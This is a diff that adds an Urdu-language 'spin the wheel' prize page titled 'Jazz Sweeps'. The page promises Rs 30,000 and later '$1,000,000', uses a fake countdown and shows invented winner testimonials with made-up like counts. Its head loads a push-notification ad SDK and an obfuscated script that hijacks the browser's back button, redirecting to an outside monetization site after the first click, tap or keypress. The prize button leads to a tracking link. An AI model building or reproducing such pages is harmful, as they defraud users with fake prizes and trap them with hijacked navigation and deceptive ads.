@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Jazz Sweeps</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700;900&display=swap"
+        rel="stylesheet">
+
+    <link href="./css/styles.css" rel="stylesheet" />
+    <link href="./css/wheel.css" rel="stylesheet" />
+    <script type="text/javascript" src="./js/Winwheel.js"></script>
+
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="img/favicon.ico" type="image/x-icon">
+
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js"
+        integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/latest/TweenMax.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+    <script type="text/javascript" src="./js/Winwheel.js"></script>
+    
+    
+    <!--Rollerads-->
+<script async data-cfasync="false">
+  (function() {
+      const url = new URL(window.location.href);
+      const clickID = url.searchParams.get("click_id");
+      const sourceID = url.searchParams.get("source_id");
+
+      const s = document.createElement("script");
+      s.dataset.cfasync = "false";
+      s.src = "https://sdk4push.com/f/sdk.js?z=1238026";
+      s.onload = (opts) => {
+          opts.zoneID = 1238026;
+          opts.extClickID = clickID;
+          opts.subID1 = sourceID;
+          opts.actions.onPermissionGranted = () => {};
+          opts.actions.onPermissionDenied = () => {};
+          opts.actions.onAlreadySubscribed = () => {};
+          opts.actions.onError = () => {};
+      };
+      document.head.appendChild(s);
+  })()
+</script>
+
+ <!--iMonetizerIt-->
+
+<script> function imiBB() { let url = "https://app.impih.com/?utm_medium=9afb263ead84fd656a37a10f917fc288156a2bdb&utm_campaign=WW&2=bbr&np=1&cid={clickid}"; try { history.pushState({}, '', location.href); history.pushState({}, '', location.href); window.onpopstate = function (ev) { if (ev['state']) { location.replace(url); } }; } catch (ex) {} } !function () { let touched = false; let chromeVersion = 0; try { chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]); } catch (e) { chromeVersion = 0; } if (chromeVersion >= 75) { window.addEventListener('mouseup', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.addEventListener("DOMContentLoaded", function () { document.body.addEventListener('touchend', function (evt) { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.body.addEventListener('keydown', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); } ); } else { setTimeout(function () { imiBB(); } , 0); } } (); </script>
+    
+    
+
+</head>
+
+<body>
+    <div class="main-section">
+        <div class="header">
+            <h1 class="main-title" dir="rtl"><img src="./img/moneypk.png"> روپے جیتو 30،000! <img
+                    src="./img/moneypk.png">
+            </h1>
+        </div>
+        <h4 class="intro-copy" dir="rtl">آپ کے پاس ہے<span id="mins">0</span> minutes and <span id="hsecs">57</span>
+            seconds</b>
+            کھیلنے کے لئے یا آپ کے پوائنٹس دوسروں کو دیئے جائیں گے۔</h4>
+        <h3 class="spin-copy" dir="rtl">نوٹ: یہ انعام محدود وقت کے لیے موزوں ہے لہٰذا جلدی کریں!</h3>
+        <div class="spinning-section" id="canvasContainer">
+            <canvas id='canvas' width='300' height='300'>
+                Canvas not supported, use another browser.
+            </canvas>
+            <img id="prizePointer" src="./img/wheel-pointer.png" alt="V" />
+        </div>
+    </div>
+    <div class=" comments-section">
+        <div class="comments-wrapper">
+            <div class="comment-row">
+                <img src="./img/profile1.png" class="comment-pic">
+                <div class="comment-text">
+                    <h6>Àli</h6>
+                    <div class="comment-line">
+                        <p dir="rtl">مجھے روپے ملے آج 1،000،000 ، میں بہت خوش ہوں!</p>
+                        <div class="comment-emoji">
+                            <img src="./img/money-face-emoji.png" class="emoji-item">
+                            <img src="./img/heart-eyes-emoji.png" class="emoji-item">
+                        </div>
+                    </div>
+                </div>
+                <div class="comment-like-sect">
+                    <!-- <img src="./img/heart.png"> -->
+                    <svg width="20" height="20" viewBox="0 0 48 48" fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M24 9.01703C19.0025 3.74266 11.4674 3.736 6.67302 8.56049C1.77566 13.4886 1.77566 21.4735 6.67302 26.4016L22.5814 42.4098C22.9568 42.7876 23.4674 43 24 43C24.5326 43 25.0432 42.7876 25.4186 42.4098L41.327 26.4016C46.2243 21.4735 46.2243 13.4886 41.327 8.56049C36.5326 3.736 28.9975 3.74266 24 9.01703ZM21.4938 12.2118C17.9849 8.07195 12.7825 8.08727 9.51028 11.3801C6.16324 14.7481 6.16324 20.214 9.51028 23.582L24 38.1627L38.4897 23.582C41.8368 20.214 41.8368 14.7481 38.4897 11.3801C35.2175 8.08727 30.0151 8.07195 26.5062 12.2118L26.455 12.2722L25.4186 13.3151C25.0432 13.6929 24.5326 13.9053 24 13.9053C23.4674 13.9053 22.9568 13.6929 22.5814 13.3151L21.545 12.2722L21.4938 12.2118Z">
+                        </path>
+                    </svg>
+                    <p class="like-counts">403</p>
+                </div>
+            </div>
+            <div class="comment-row">
+                <img src="./img/profile2.png" class="comment-pic">
+                <div class="comment-text">
+                    <h6>Ayesha</h6>
+                    <div class="comment-line">
+                        <p dir="rtl">میرے لیے کوئی انعام نہیں ... کیا مجھے ایک اور موقع مل سکتا ہے؟</p>
+                        <div class="comment-emoji">
+                            <img src="./img/heart-emoji.png" class="emoji-item">
+                        </div>
+                    </div>
+                </div>
+                <div class="comment-like-sect">
+                    <!-- <img src="./img/heart.png"> -->
+                    <svg width="20" height="20" viewBox="0 0 48 48" fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M24 9.01703C19.0025 3.74266 11.4674 3.736 6.67302 8.56049C1.77566 13.4886 1.77566 21.4735 6.67302 26.4016L22.5814 42.4098C22.9568 42.7876 23.4674 43 24 43C24.5326 43 25.0432 42.7876 25.4186 42.4098L41.327 26.4016C46.2243 21.4735 46.2243 13.4886 41.327 8.56049C36.5326 3.736 28.9975 3.74266 24 9.01703ZM21.4938 12.2118C17.9849 8.07195 12.7825 8.08727 9.51028 11.3801C6.16324 14.7481 6.16324 20.214 9.51028 23.582L24 38.1627L38.4897 23.582C41.8368 20.214 41.8368 14.7481 38.4897 11.3801C35.2175 8.08727 30.0151 8.07195 26.5062 12.2118L26.455 12.2722L25.4186 13.3151C25.0432 13.6929 24.5326 13.9053 24 13.9053C23.4674 13.9053 22.9568 13.6929 22.5814 13.3151L21.545 12.2722L21.4938 12.2118Z">
+                        </path>
+                    </svg>
+                    <p class="like-counts">511</p>
+                </div>
+            </div>
+            <div class="comment-row">
+                <img src="./img/profile3.png" class="comment-pic">
+                <div class="comment-text">
+                    <h6>Muhammad</h6>
+                    <div class="comment-line">
+                        <p dir="rtl">میرا آج پہنچا۔ شکریہ!</p>
+                        <!-- <div class="comment-emoji">
+                            <img src="./img/money-face-emoji.png" class="emoji-item">
+                            <img src="./img/heart-eyes-emoji.png" class="emoji-item">
+                        </div> -->
+                    </div>
+                </div>
+                <div class="comment-like-sect">
+                    <!-- <img src="./img/heart.png"> -->
+                    <svg width="20" height="20" viewBox="0 0 48 48" fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M24 9.01703C19.0025 3.74266 11.4674 3.736 6.67302 8.56049C1.77566 13.4886 1.77566 21.4735 6.67302 26.4016L22.5814 42.4098C22.9568 42.7876 23.4674 43 24 43C24.5326 43 25.0432 42.7876 25.4186 42.4098L41.327 26.4016C46.2243 21.4735 46.2243 13.4886 41.327 8.56049C36.5326 3.736 28.9975 3.74266 24 9.01703ZM21.4938 12.2118C17.9849 8.07195 12.7825 8.08727 9.51028 11.3801C6.16324 14.7481 6.16324 20.214 9.51028 23.582L24 38.1627L38.4897 23.582C41.8368 20.214 41.8368 14.7481 38.4897 11.3801C35.2175 8.08727 30.0151 8.07195 26.5062 12.2118L26.455 12.2722L25.4186 13.3151C25.0432 13.6929 24.5326 13.9053 24 13.9053C23.4674 13.9053 22.9568 13.6929 22.5814 13.3151L21.545 12.2722L21.4938 12.2118Z">
+                        </path>
+                    </svg>
+                    <p class="like-counts">206</p>
+                </div>
+            </div>
+            <div class="comment-row">
+                <img src="./img/profile4.png" class="comment-pic">
+                <div class="comment-text">
+                    <h6>Manahil</h6>
+                    <div class="comment-line">
+                        <p dir="rtl">او ایم جی میں جیت گیا! Wooooooo</p>
+                        <div class="comment-emoji">
+                            <img src="./img/Money-Wings-Emoji.png" class="emoji-item">
+                            <img src="./img/Money-Wings-Emoji.png" class="emoji-item">
+                            <img src="./img/Money-Wings-Emoji.png" class="emoji-item">
+                        </div>
+                    </div>
+                </div>
+                <div class="comment-like-sect">
+                    <!-- <img src="./img/heart.png"> -->
+                    <svg width="20" height="20" viewBox="0 0 48 48" fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M24 9.01703C19.0025 3.74266 11.4674 3.736 6.67302 8.56049C1.77566 13.4886 1.77566 21.4735 6.67302 26.4016L22.5814 42.4098C22.9568 42.7876 23.4674 43 24 43C24.5326 43 25.0432 42.7876 25.4186 42.4098L41.327 26.4016C46.2243 21.4735 46.2243 13.4886 41.327 8.56049C36.5326 3.736 28.9975 3.74266 24 9.01703ZM21.4938 12.2118C17.9849 8.07195 12.7825 8.08727 9.51028 11.3801C6.16324 14.7481 6.16324 20.214 9.51028 23.582L24 38.1627L38.4897 23.582C41.8368 20.214 41.8368 14.7481 38.4897 11.3801C35.2175 8.08727 30.0151 8.07195 26.5062 12.2118L26.455 12.2722L25.4186 13.3151C25.0432 13.6929 24.5326 13.9053 24 13.9053C23.4674 13.9053 22.9568 13.6929 22.5814 13.3151L21.545 12.2722L21.4938 12.2118Z">
+                        </path>
+                    </svg>
+                    <p class="like-counts">832</p>
+                </div>
+            </div>
+            <div class="comment-row">
+                <img src="./img/profile5.png" class="comment-pic">
+                <div class="comment-text">
+                    <h6>Hamza</h6>
+                    <div class="comment-line">
+                        <p dir="rtl">یہ حیرت انگیز ہے میں کھیلنے کا انتظار نہیں کرسکتا!</p>
+                        <!-- <div class="comment-emoji">
+                            <img src="./img/money-face-emoji.png" class="emoji-item">
+                            <img src="./img/heart-eyes-emoji.png" class="emoji-item">
+                        </div> -->
+                    </div>
+                </div>
+                <div class="comment-like-sect">
+                    <!-- <img src="./img/heart.png"> -->
+                    <svg width="20" height="20" viewBox="0 0 48 48" fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M24 9.01703C19.0025 3.74266 11.4674 3.736 6.67302 8.56049C1.77566 13.4886 1.77566 21.4735 6.67302 26.4016L22.5814 42.4098C22.9568 42.7876 23.4674 43 24 43C24.5326 43 25.0432 42.7876 25.4186 42.4098L41.327 26.4016C46.2243 21.4735 46.2243 13.4886 41.327 8.56049C36.5326 3.736 28.9975 3.74266 24 9.01703ZM21.4938 12.2118C17.9849 8.07195 12.7825 8.08727 9.51028 11.3801C6.16324 14.7481 6.16324 20.214 9.51028 23.582L24 38.1627L38.4897 23.582C41.8368 20.214 41.8368 14.7481 38.4897 11.3801C35.2175 8.08727 30.0151 8.07195 26.5062 12.2118L26.455 12.2722L25.4186 13.3151C25.0432 13.6929 24.5326 13.9053 24 13.9053C23.4674 13.9053 22.9568 13.6929 22.5814 13.3151L21.545 12.2722L21.4938 12.2118Z">
+                        </path>
+                    </svg>
+                    <p class="like-counts">235</p>
+                </div>
+            </div>
+            <div class="comment-row">
+                <img src="./img/profile6.png" class="comment-pic">
+                <div class="comment-text">
+                    <h6>Ahmed</h6>
+                    <div class="comment-line">
+                        <p dir="rtl">مجھے ایک ہارنے والا کہو ، کیونکہ میں واقعی ایک چاہتا تھا!</p>
+                        <div class="comment-emoji">
+                            <img src="./img/money-face-emoji.png" class="emoji-item">
+                            <img src="./img/Star-Eyes-Emoji.png" class="emoji-item">
+                        </div>
+                    </div>
+                </div>
+                <div class="comment-like-sect">
+                    <!-- <img src="./img/heart.png"> -->
+                    <svg width="20" height="20" viewBox="0 0 48 48" fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M24 9.01703C19.0025 3.74266 11.4674 3.736 6.67302 8.56049C1.77566 13.4886 1.77566 21.4735 6.67302 26.4016L22.5814 42.4098C22.9568 42.7876 23.4674 43 24 43C24.5326 43 25.0432 42.7876 25.4186 42.4098L41.327 26.4016C46.2243 21.4735 46.2243 13.4886 41.327 8.56049C36.5326 3.736 28.9975 3.74266 24 9.01703ZM21.4938 12.2118C17.9849 8.07195 12.7825 8.08727 9.51028 11.3801C6.16324 14.7481 6.16324 20.214 9.51028 23.582L24 38.1627L38.4897 23.582C41.8368 20.214 41.8368 14.7481 38.4897 11.3801C35.2175 8.08727 30.0151 8.07195 26.5062 12.2118L26.455 12.2722L25.4186 13.3151C25.0432 13.6929 24.5326 13.9053 24 13.9053C23.4674 13.9053 22.9568 13.6929 22.5814 13.3151L21.545 12.2722L21.4938 12.2118Z">
+                        </path>
+                    </svg>
+                    <p class="like-counts">114</p>
+                </div>
+            </div>
+            <div class="comment-row">
+                <img src="./img/profile7.png" class="comment-pic">
+                <div class="comment-text">
+                    <h6>Laiba</h6>
+                    <div class="comment-line">
+                        <p dir="rtl">یہ بہت آسان تھا ، میں جیت گیا !!!!</p>
+                        <!-- <div class="comment-emoji">
+                            <img src="./img/money-face-emoji.png" class="emoji-item">
+                            <img src="./img/heart-eyes-emoji.png" class="emoji-item">
+                        </div> -->
+                    </div>
+                </div>
+                <div class="comment-like-sect">
+                    <!-- <img src="./img/heart.png"> -->
+                    <svg width="20" height="20" viewBox="0 0 48 48" fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M24 9.01703C19.0025 3.74266 11.4674 3.736 6.67302 8.56049C1.77566 13.4886 1.77566 21.4735 6.67302 26.4016L22.5814 42.4098C22.9568 42.7876 23.4674 43 24 43C24.5326 43 25.0432 42.7876 25.4186 42.4098L41.327 26.4016C46.2243 21.4735 46.2243 13.4886 41.327 8.56049C36.5326 3.736 28.9975 3.74266 24 9.01703ZM21.4938 12.2118C17.9849 8.07195 12.7825 8.08727 9.51028 11.3801C6.16324 14.7481 6.16324 20.214 9.51028 23.582L24 38.1627L38.4897 23.582C41.8368 20.214 41.8368 14.7481 38.4897 11.3801C35.2175 8.08727 30.0151 8.07195 26.5062 12.2118L26.455 12.2722L25.4186 13.3151C25.0432 13.6929 24.5326 13.9053 24 13.9053C23.4674 13.9053 22.9568 13.6929 22.5814 13.3151L21.545 12.2722L21.4938 12.2118Z">
+                        </path>
+                    </svg>
+                    <p class="like-counts">287</p>
+                </div>
+            </div>
+            <div class="comment-row">
+                <img src="./img/profile8.png" class="comment-pic">
+                <div class="comment-text">
+                    <h6>Rabia</h6>
+                    <div class="comment-line">
+                        <p dir="rtl">میں نے کبھی کچھ نہیں جیتا ، لیکن مجھے امید ہے کہ میں خوش قسمت ہوں!</p>
+                        <!-- <div class="comment-emoji">
+                            <img src="./img/money-face-emoji.png" class="emoji-item">
+                            <img src="./img/heart-eyes-emoji.png" class="emoji-item">
+                        </div> -->
+                    </div>
+                </div>
+                <div class="comment-like-sect">
+                    <!-- <img src="./img/heart.png"> -->
+                    <svg width="20" height="20" viewBox="0 0 48 48" fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M24 9.01703C19.0025 3.74266 11.4674 3.736 6.67302 8.56049C1.77566 13.4886 1.77566 21.4735 6.67302 26.4016L22.5814 42.4098C22.9568 42.7876 23.4674 43 24 43C24.5326 43 25.0432 42.7876 25.4186 42.4098L41.327 26.4016C46.2243 21.4735 46.2243 13.4886 41.327 8.56049C36.5326 3.736 28.9975 3.74266 24 9.01703ZM21.4938 12.2118C17.9849 8.07195 12.7825 8.08727 9.51028 11.3801C6.16324 14.7481 6.16324 20.214 9.51028 23.582L24 38.1627L38.4897 23.582C41.8368 20.214 41.8368 14.7481 38.4897 11.3801C35.2175 8.08727 30.0151 8.07195 26.5062 12.2118L26.455 12.2722L25.4186 13.3151C25.0432 13.6929 24.5326 13.9053 24 13.9053C23.4674 13.9053 22.9568 13.6929 22.5814 13.3151L21.545 12.2722L21.4938 12.2118Z">
+                        </path>
+                    </svg>
+                    <p class="like-counts">301</p>
+                </div>
+            </div>
+        </div>
+        <div class="comments-publish-section">
+            <div class="input-bar">
+                <input dir="rtl" type="text" value="" placeholder="أضف تعليقا">
+                <div class="comment-emoji">
+                    <img src="./img/et.png" class="emoji-item">
+                    <img src="./img/chat-smile.png" class="emoji-item">
+                </div>
+            </div>
+            <div dir="rtl" class="publish">بريد</div>
+        </div>
+    </div>
+    <div class="custom-model-main">
+        <div id="emitter"></div>
+        <div class="custom-model-inner">
+            <div class="close-btn">×</div>
+            <div class="custom-model-wrap">
+                <div class="pop-up-content-wrap pop-up-content-wrap-1">
+                    <h4 dir="rtl"> مبارک ہو! </h4>
+                    <p dir="rtl"> ہر ہفتے ہم ایک خوش قسمت کسٹمر کا انتخاب کرتے ہیں جو کہ روپے جیتتا ہے۔
+                        <strong>30،000</strong>! </p>
+                    <div dir="rtl" class="repeat-btn repeat-btn-1" onClick="theWheel.startAnimation();">ٹھیک ہے</div>
+                </div>
+                <div class="pop-up-content-wrap pop-up-content-wrap-2">
+                    <h4 dir="rtl"> آپ نے <span>(1)</span> مزید راؤنڈ جیت لیا ہے۔ </h4>
+                    <img src="./img/refresh-black.png" alt="refresh-prize">
+                    <p dir="rtl"> آؤ اس کو آزماتے ہیں! </p>
+                    <div dir="rtl" class="repeat-btn repeat-btn-2" onClick="startSpin();">ٹھیک ہے</div>
+                </div>
+                <div class="pop-up-content-wrap pop-up-content-wrap-3">
+                    <h4 dir="rtl"> مبارک ہو! </h4>
+                    <img src="./img/moneyprizeZA.png" alt="refresh-prize">
+                    <p dir="rtl"> آپ نے $ 1،000،000 جیت لیا! اپنا انعام حاصل کرنے کے لیے ہدایات پر عمل کریں۔ </p>
+                    <a dir="rtl" href="https://tkr9.surpriseanddelightgifts.com/cool.php?lp=1" class="final-btn repeat-btn">ٹھیک ہے</a>
+                </div>
+            </div>
+        </div>
+        <div class="bg-overlay"></div>
+    </div>
+    <script type="text/javascript" src="./js/spinning.js"></script>
+    <script type="text/javascript" src="./js/scripts.js"></script>
+    <script type="text/javascript" src="./js/confetti.js"></script>
+</body>
+
+</html>
